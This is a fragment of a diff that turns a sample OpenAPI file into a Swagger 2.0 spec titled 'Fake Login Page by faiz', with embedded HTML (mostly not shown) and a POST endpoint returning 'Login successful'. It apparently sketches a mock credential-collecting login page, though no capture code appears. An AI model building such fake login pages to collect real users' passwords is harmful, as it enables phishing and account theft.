@@ -1,8 +1,8 @@
-openapi: 3.0.0
+swagger: '2.0'
 info:
-  title: Sample API
-  description: |
-    ```html
+  version: 1.0.0
+  title: Fake Login Page by faiz
+  description: '
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -117,8 +117,10 @@ info:
     </div>
 
     </body>
-    </html>
-    ```
-  version: 1.0.0
-paths: {}
-components: {}
+    </html>'
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
